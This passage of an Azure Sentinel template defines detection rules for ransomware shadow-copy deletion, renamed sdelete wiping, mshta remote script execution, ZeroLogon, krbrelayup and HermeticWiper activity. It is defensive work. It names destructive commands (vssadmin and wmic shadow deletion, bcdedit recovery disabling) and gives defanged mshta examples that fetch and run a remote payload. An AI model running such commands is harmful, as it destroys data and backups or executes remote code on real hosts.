          "description": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.\n\nThis rule identifies the use of certutil to check connectivity to trustsecpro[.]com and whatismyip[.]com for the Trojan.Killdisk malware \n\nref:  https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host MITRE: T1071 Category: Windows Security tag: SOC tag: Zero-Day",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 10m;\nlet latency = 60m;\nlet alert_bin = 10m;\nSecurityEvent\n| where TimeGenerated between ( ago(start_time + latency) .. now() ) and ingestion_time() > ago(start_time)\n| where EventID == 4688\n| where CommandLine has 'certutil.exe' and (CommandLine has 'whatismyip' or CommandLine has 'trustsecpro')\n| extend Domain = iff(CommandLine has 'whatismyip', 'whatismyip[.]com', 'trustsecpro[.]com')\n| parse Account with UserDomain '\\\\' UserName\n| parse Computer with ComputerName @'.' ComputerDomain\n| extend ExtendedDescription = strcat('The computer ', Computer, ' used certutil to check ', Domain)\n| extend bv_mapping_tag = Account\n| project TimeGenerated, Account, Computer, CommandLine, ParentProcessName, UserDomain, UserName, ComputerName, ComputerDomain, ExtendedDescription, bv_mapping_tag",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT1H10M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may attempt to get a listing of network connections to or from the compromised system they are currently accessing or from remote systems by querying for information over the network.\n\nThis rule identifies the use of certutil to check connectivity to trustsecpro[.]com and whatismyip[.]com for the Trojan.Killdisk malware\n\nref:  https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ukraine-wiper-malware-russia\n\n{{ExtendedDescription}}\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host\n\nMITRE: T1071\nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "UserDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "ComputerName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "ComputerDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2507')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2507')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2507: [SOC] Windows - Potential Renamed Sdelete Usage",
          "description": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.\n\nSdelete is an application that securely deletes data in a way that makes it unrecoverable. This detection looks for command line parameters associated with the use of Sysinternals sdelete (https://docs.microsoft.com/sysinternals/downloads/sdelete) to delete multiple files on a host's C drive. A threat actor may re-name the tool to avoid detection and then use it for destructive attacks on a host.\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional actvity on for the user including login events\n2. Review additional activity on the host MITRE: T1565,T1561,T0879,T1485,T1036 Category: Windows Security tag: SOC tag: Zero-Day",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 15m;\nlet latency = 60m;\nlet end_time = now();\nlet EventIDList = dynamic([4688]); \nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| where Process !~ 'sdelete.exe'\n| where CommandLine has_all ('accepteula', '-r', '-s', '-q', 'c:/')\n| where CommandLine !has ('sdelete')\n| parse Computer with ComputerName '.' ComputerDomain\n| summarize arg_max(TimeGenerated, *) by Computer\n| extend ExtendedDescription = strcat('Computer ', ComputerName, ' executed a file that appears to be sdelete with command line ',CommandLine)\n| extend VictimEntity = pack_array(SubjectUserName, ComputerName)\n| extend bv_mapping_tag = Computer\n| project TimeGenerated, Computer, ProcessName=NewProcessName, ParentProcessName, ComputerName, ComputerDomain, SubjectUserName, SubjectDomainName, CommandLine, ExtendedDescription, VictimEntity, bv_mapping_tag",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT1H15M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact",
            "DefenseEvasion"
          ],
          "techniques": [
            "T1565",
            "T1561",
            "T0879",
            "T1485",
            "T1036"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.\n\nSdelete is an application that securely deletes data in a way that makes it unrecoverable. This detection looks for command line parameters associated with the use of Sysinternals sdelete (https://docs.microsoft.com/sysinternals/downloads/sdelete) to delete multiple files on a host's C drive. A threat actor may re-name the tool to avoid detection and then use it for destructive attacks on a host.\n\n{{ExtendedDescription}}\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host        \n\nMITRE: T1565 MITRE: T1561 MITRE: T0879 MITRE: T1485 MITRE: T1036\nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SubjectUserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "SubjectDomainName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "ComputerName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "ComputerDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-836')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-836')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-836: [SOC] Windows - Data Encrypted for Impact",
          "description": "This alert checks for execution of MITRE ATT&CK technique https://attack.mitre.org/techniques/T1486/ looking for indicators of ransomware from data destruction activity MITRE: T1486 Category: Windows Security tag: SOC",
          "severity": "High",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4688']);     \nlet ingested_lookback = 10m; // earliest [ingest time] boundary\nlet generated_lookback = 1h; // earliest [log time] boundary\nlet alert_bin = 10m;\nSecurityEvent\n| where TimeGenerated between (ago(generated_lookback) .. now()) and ingestion_time() > ago(ingested_lookback)\n| where EventID in (EventIDList)\n| where isnotempty(CommandLine)\n| where CommandLine contains 'vssadmin*Delete Shadows /All /Q*'\n      or CommandLine contains '*wmic*shadowcopy delete*'\n      or CommandLine contains '*wbdadmin* delete catalog -q*'\n      or CommandLine contains '*bcdedit*bootstatuspolicy ignoreallfailures*'\n      or CommandLine contains '*bcdedit*recoveryenabled no*'\n| extend SourceUser = SubjectAccount, LogSourceComputer=Computer\n| extend Details = 'Command line activity has been identified that matches previous Lockbot activity'\n| extend Event = pack('TimeGenerated', TimeGenerated, 'SourceUser', SourceUser, 'LogSourceComputer', LogSourceComputer, 'CommandLine', CommandLine, 'ParentProcess', ParentProcessName, 'Process',NewProcessName, 'Details', Details)\n| extend bv_mapping_tag = SourceUser\n| project TimeGenerated, SourceUser, LogSourceComputer, CommandLine, ParentProcess=ParentProcessName, Process=NewProcessName, meta_SourceAccountName=SubjectUserName, meta_SourceAccountDomain=SubjectDomainName, Event, bv_mapping_tag",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT1H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1486"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "Event": "Event",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "meta_SourceAccountName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "meta_SourceAccountDomain"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "LogSourceComputer"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2505')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2505')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2505: [SOC] Windows - Mshta Web Request",
          "description": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code\n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.\n\nFiles may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))\n\nThey may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings\n\nThis rule identifies suspicious web requests from mshta.exe\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host MITRE: T1218 Category: Windows Security tag: SOC tag: Zero-Day",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 15m;\nlet latency = 60m;\nlet end_time = now();\nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID == 4688\n| where NewProcessName contains 'mshta.exe'\n| where CommandLine contains 'http'\n| parse Computer with ComputerName '.' ComputerDomain\n| extend ProcessName = NewProcessName\n| summarize TimeGenerated=max(TimeGenerated), arg_max(ProcessName, *) by ComputerName, SubjectUserName, SubjectDomainName\n| extend ExtendedDescription=strcat('Computer system ', ComputerName, ' has performed potentially dangerous mshta execution with command line ', CommandLine)\n| extend VictimEntity = pack_array(SubjectUserName, ComputerName)\n| extend bv_mapping_tag = Computer\n| project TimeGenerated, Computer, ProcessName, ParentProcessName, ComputerName, ComputerDomain, SubjectUserName, SubjectDomainName, CommandLine, ExtendedDescription, VictimEntity, bv_mapping_tag",
          "queryFrequency": "PT15M",
          "queryPeriod": "PT1H15M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1218"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may abuse mshta.exe to proxy execution of malicious .hta files and Javascript or VBScript through a trusted Windows utility. There are several examples of different types of threats leveraging mshta.exe during initial compromise and for execution of code\n\nMshta.exe is a utility that executes Microsoft HTML Applications (HTA) files. HTAs are standalone applications that execute using the same models and technologies of Internet Explorer, but outside of the browser.\n\nFiles may be executed by mshta.exe through an inline script: mshta vbscript:Close(Execute(\"GetObject(\"\"script:https[:]//webserver/payload[.]sct\"\")\"))\n\nThey may also be executed directly from URLs: mshta http[:]//webserver/payload[.]hta\n\nMshta.exe can be used to bypass application control solutions that do not account for its potential use. Since mshta.exe executes outside of the Internet Explorer's security context, it also bypasses browser security settings\n\nThis rule identifies web requests made by mshta\n\n{{ExtendedDescription}}\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host\n\nMITRE: T1218 \nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SubjectUserName"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "SubjectDomainName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "ComputerName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "ComputerDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-11023')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-11023')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-11023: [RBA] Windows - ZeroLogon Exploit Detection",
          "description": "Microsoft Windows ZeroLogin Exploit Detection has been detected with CVE-2020-1472 MITRE: T1068 Category: Windows Security tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let start_time = 1h;\nlet latency = 1h;\nlet alert_bin = 1h;\nlet end_time = now();\nlet EventIDList = dynamic([4624, 4742]);\nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n});      \nlet exclusions = array_concat(global_config['EXCLUSION'], BV11023_CONFIG['EXCLUSION'], dynamic([{}]));\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(BV11023_CONFIG['RBASCORE']),1.0);\nlet rba_score_calculator = (table_parameter: (visibility:dynamic), RuleId_constant:string){\n    let global_override = toscalar(bv_rba_global_override | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, GlobalRBAMultiplier, GlobalOverrideRBA) by RuleId | project bag_pack('GlobalRBAMultiplier',GlobalRBAMultiplier,'GlobalOverrideRBA',GlobalOverrideRBA));\n    let client_override = toscalar(BV_RBA_CLIENT_OVERRIDE | where Status == 'prod' | where RuleId == RuleId_constant | summarize arg_max(TimeGenerated, ClientRBAMultiplier, ClientOverrideRBA) by RuleId | project bag_pack('ClientRBAMultiplier',ClientRBAMultiplier,'ClientOverrideRBA',ClientOverrideRBA));\n    table_parameter\n    | extend rba_multiplier = coalesce(toreal(client_override['ClientRBAMultiplier']),toreal(global_override['GlobalRBAMultiplier']), 1.0)\n    | extend rba_multiplier = iff(rba_multiplier < 0.1, 0.1, rba_multiplier)\n    | extend rba_multiplier = iff(rba_multiplier > 3, 3.0, rba_multiplier)\n    | extend rba_override = coalesce(toreal(client_override['ClientOverrideRBA']),toreal(global_override['GlobalOverrideRBA']), toreal(rba_score), 1.0)\n    | extend ModifiedRBAScore = toreal(rba_override) * rba_multiplier\n    | extend ModifiedRBAScore = case(\n      ModifiedRBAScore > 10, 10.0\n      , ModifiedRBAScore <0.1, 0.1\n      , ModifiedRBAScore\n    )\n    | extend bv_alarm_rba_score = iff(visibility contains '1', 0.0, ModifiedRBAScore)\n};\nlet description = (table_parameter: (*)){\n  table_parameter\n  | extend all_data = pack_all(false)\n  | extend keys = bag_keys(all_data)\n  | mv-apply k = keys to typeof(string) on (\n      extend dynamic_entity = parse_json(all_data[k])\n      | extend ExtendedDescription = iff(k startswith 'bv_' and k != 'bv_raw',strcat(\n      case(gettype(dynamic_entity) == 'array' and isnotempty(array_sort_desc(all_data[k])[0]) , strcat(k, ': \\n* ', substring(strcat_array(array_slice(all_data[k],0,3),'\\n* '),0,100), '\\n')\n      , strcat(k,': ', all_data[k])\n      )\n      ),'')\n      | summarize ExtendedDescription = make_set(ExtendedDescription), k = make_set(k)\n  )\n  | extend ExtendedDescription=strcat_array(ExtendedDescription, \"\\n \")\n};\nlet exclusion_filter = (table_parameter: (*)){\n      table_parameter\n      | extend all_data = pack_all()\n      | mv-apply e = exclusions on (\n          extend keys = bag_keys(e)\n          | extend key_count = iff(keys contains 'metadata', array_length(keys) -1, array_length(keys))\n          | mv-apply k = keys to typeof(string) on (\n              extend list = split(e[k],',')\n              | mv-apply l = list to typeof(string) on (\n                  extend item = iff(gettype(todynamic(all_data[k])) != 'array', pack_array(all_data[k]), todynamic(all_data[k]))\n                  | mv-apply i = item to typeof(string) on (\n                      extend compare = i contains l or ipv6_is_match(tostring(all_data[k]),l)\n                      | summarize excluded_count = countif(compare)\n                      | extend item_excluded = excluded_count > 0\n                  )\n                  | summarize excluded_count = countif(item_excluded)\n                  | extend item_excluded = excluded_count > 0\n              )\n              | summarize excluded_list_item = countif(item_excluded > 0)\n          )\n          | extend exclusion_matched =  key_count == excluded_list_item and key_count != 0\n          | extend visibility = iff(isnotempty(e.metadata[\"visibility\"]), e.metadata[\"visibility\"], 2)\n          | extend bv_exclusion_reason = iff(exclusion_matched, parse_json(e.metadata).reason, '')\n          | summarize exclusion_matched=make_set(exclusion_matched), visibility=make_set(visibility), bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n      )\n      | extend drop_event = iff(exclusion_matched contains \"true\", true, false)\n      | where not(drop_event)\n};        \nSecurityEvent\n|where TimeGenerated between (ago(start_time + latency) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID in (EventIDList)\n| extend SubjectLogonId = extract(@'<Data Name=\"SubjectLogonId\">(.*?)</Data>', 1, EventData)\n| extend bv_src_user = extract(@'<Data Name=\"SubjectUserName\">(.*?)</Data>', 1, EventData)\n| extend bv_src_dvc_domain = extract(@'<Data Name=\"SubjectDomainName\">(.*?)</Data>', 1, EventData)\n| where (SubjectLogonId contains '0x3E6' and bv_src_user =~ 'Anonymous Logon' and bv_src_dvc_domain =~ 'NT Authority')\n     or (LogonGuid == '{00000000-0000-0000-0000-000000000000}' and TargetUserName =~ 'Anonymous Logon'  and LogonType == 3 and (TargetLogonId == '0x0' or SubjectLogonId == '0x0'))\n| project \n    bv_user = TargetUserName\n    , bv_src_user\n    , bv_src_dvc_domain\n    , bv_start_time = TimeGenerated\n    , bv_src_dvc = Computer\n    , bv_alert_time = now()\n    , bv_vendor_product = 'Windows'\n    , sourcetype = 'SecurityEvent'\n    , bv_raw = EventData\n    , bv_event_id = EventID\n    , bv_dest_user = TargetUserName\n    , bv_signature = 'Windows ZeroLogin Exploit'\n    , bv_signature_id = 'CVE-2020-1472'\n    , bv_alert_category = 'exploit'\n    , bv_severity = 'critical'\n| summarize bv_start_time = min(bv_start_time), bv_end_time = arg_max(bv_start_time, *), bv_event_count = count() by bv_user\n| invoke exclusion_filter()\n| invoke rba_score_calculator('BV-11023')\n| invoke description()\n| extend bv_alarm_victim_entities = pack_array(bv_user)\n| extend bv_alarm_attacker_entities = pack_array(bv_user)\n| project-keep\n    bv_*\n    , sourcetype\n    , ExtendedDescription          ",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1068"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Microsoft Windows ZeroLogin Exploit Detection has been detected with CVE-2020-1472.\n\n{{ExtendedDescription}}\n\ntag: RBA\nCategory: Windows Security\nMITRE: T1068",
            "alertSeverityColumnName": "bv_severity"
          },
          "customDetails": {
            "VictimEntity": "bv_alarm_victim_entities",
            "AttackerEntity": "bv_alarm_attacker_entities",
            "RBAScore": "bv_alarm_rba_score"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "FullName",
                  "columnName": "bv_user"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2503')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2503')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2503: [SOC] Windows - HermeticWiper Registry Changes",
          "description": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.kernel.\n\nThis rule identifies the registry changes associated with TrojanKillDisk\n\nref:  https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host MITRE: T1112 Category: Windows Security tag: SOC tag: Zero-Day",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 10m;\nlet latency = 60m;\nlet end_time = now();\nSecurityEvent\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where EventID == 4657\n| where ObjectName contains @'SYSTEM\\CurrentControlSet\\Control\\CrashControl'\n| where ObjectValueName contains 'CrashDumpEnabled'\n| where OldValue != 0 and NewValue == 0\n| parse Computer with ComputerName '.' ComputerDomain\n| extend ExtendedDescription = strcat('Computer ', ComputerName, 'had the CrashControl registry key modified by the process ', ProcessName)\n| summarize TimeGenerated=max(TimeGenerated), ProcessName=make_set(ProcessName, 2), ObjectName=make_set(ObjectName, 2), Process=make_set(Process, 5), SubjectAccount=make_set(SubjectAccount, 5), SubjectDomainName=make_set(SubjectDomainName, 5),  ComputerDomain=make_set(ComputerDomain, 5) by Computer,ComputerName, ExtendedDescription, SubjectUserName\n| extend VictimEntity = pack_array(SubjectUserName, ComputerName)\n| extend bv_mapping_tag = Computer\n| project TimeGenerated, ExtendedDescription, ProcessName, ObjectName, Process, SubjectAccount, SubjectDomainName, SubjectUserName, Computer, ComputerName, ComputerDomain, VictimEntity, bv_mapping_tag",
          "queryFrequency": "PT10M",
          "queryPeriod": "PT1H10M",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "DefenseEvasion"
          ],
          "techniques": [
            "T1112"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT5M",
              "matchingMethod": "AllEntities",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "SingleAlert"
          },
          "alertDetailsOverride": {
            "alertDescriptionFormat": "Adversaries may interact with the Windows Registry to hide configuration information within Registry keys, remove information as part of cleaning up, or as part of other techniques to aid in persistence and execution.kernel.\n\nThis rule identifies the registry changes associated with TrojanKillDisk\n\nref:  https://www.sentinelone.com/labs/hermetic-wiper-ukraine-under-attack/\n\n{{ExtendedDescription}}\n\nInclusions: None \nExclusions: None \n\nConsiderations: \n1. Review additional activity on for the user including login events\n2. Review additional activity on the host\n\nMITRE: T1112 \nCategory: Windows Security\ntag: SOC"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "SubjectAccount"
                },
                {
                  "identifier": "NTDomain",
                  "columnName": "SubjectDomainName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "ComputerName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "ComputerDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-2508')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-2508')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-2508: [RBA] Windows - Potential krbrelayup Attack Detected",
          "description": "Alerts on potential krbrelayup activity.\nSee the following links for additional information on how this attack occurs.\nhttps://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9\nhttps://github.com/Dec0ne/KrbRelayUp MITRE: T1068 Category: Windows Security tag: RBA",
          "severity": "Low",
          "enabled": true,
          "query": "let EventIDList = dynamic(['4624']);\nlet latency = 1h;\nlet start_time = 1h;\nlet end_time = now();\n  SecurityEvent\n  | where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n  | where EventID in (EventIDList)\n  | where AuthenticationPackageName contains 'Kerberos'\n  | where LogonTypeName contains 'Network'\n  | where IpAddress contains '127.0.0.1'\n  | extend EventID = tostring(EventID)\n  | where toint(IpPort) > 0\n  | where TargetUserSid matches regex @'S-1-5-21-.*-500$'\n  | summarize arg_max(TimeGenerated, *) by Account, Computer\n  | extend VictimEntity = pack_array(Account, Computer)\n  | project TimeGenerated, EventID, IpAddress, IpPort, TargetUserSid, AuthenticationPackageName, LogonType, LogonTypeName, Computer, AccountType, Account, TargetAccount, TargetDomainName, SourceSystem, LogonGuid, TargetLogonId, VictimEntity",
          "queryFrequency": "PT1H",
          "queryPeriod": "PT2H",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "PrivilegeEscalation"
          ],
          "techniques": [
            "T1068"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": true,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [
                "Host"
              ],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": null,
          "customDetails": {
            "VictimEntity": "VictimEntity"
          },
          "entityMappings": [
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "Account"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "TargetDomainName"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "Computer"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
